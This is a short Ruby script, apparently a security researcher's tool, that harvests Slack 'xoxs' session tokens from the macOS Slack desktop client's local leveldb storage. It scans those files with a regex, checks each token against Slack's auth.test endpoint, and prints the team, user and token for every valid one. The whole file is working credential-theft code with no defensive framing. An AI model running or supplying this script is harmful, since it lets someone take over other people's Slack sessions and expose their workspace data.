# toke_em.rb
# Extracts "legacy" OAUTH tokens from Slack macOS Desktop client local storage
#
# n0ncetonic
#
# Copyright 2019 Blacksun Research Labs
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or imp
# See the License for the specific language governing permissions and
# limitations under the License.

require 'net/http'
require 'json'

$auth_url = "https://slack.com/api/auth.test"
$base_dir = File.expand_path("~/Library/Application Support/Slack/Local Storage/leveldb")
$tokes = /xoxs-\d+-\d+-\d+-\h+/

def get_files()
  Dir.glob(File.join($base_dir, '/*.*'))
end

def toke(db)
  File.read(db).force_encoding('ISO-8859-1').scan($tokes)
end

def gimme_tokes()
  get_files().map { |x|
    toke(x)
  }.flatten.uniq
end

def meta_toke(tokens)
  uri = URI($auth_url)
  tokens.map { |x|
    net = Net::HTTP.start(uri.host, uri.port,
                          :use_ssl => uri.scheme == 'https') do |http|
      params = { :token => x, :pretty => 1 }
      uri.query = URI.encode_www_form(params)

      request = Net::HTTP::Get.new uri
      res = http.request request
      if res.is_a?(Net::HTTPSuccess)
        body = JSON.parse(res.body)
        if body["ok"] == true
          puts "[!] Valid Token Found\nTeam:#{body["team"]}\nUsername:#{body["user"]}\nUrl:#{body["url"]}\nToken:#{x}\n"
        end
      end
    end
    }
end

tokens = gimme_tokes()
meta_toke(tokens)
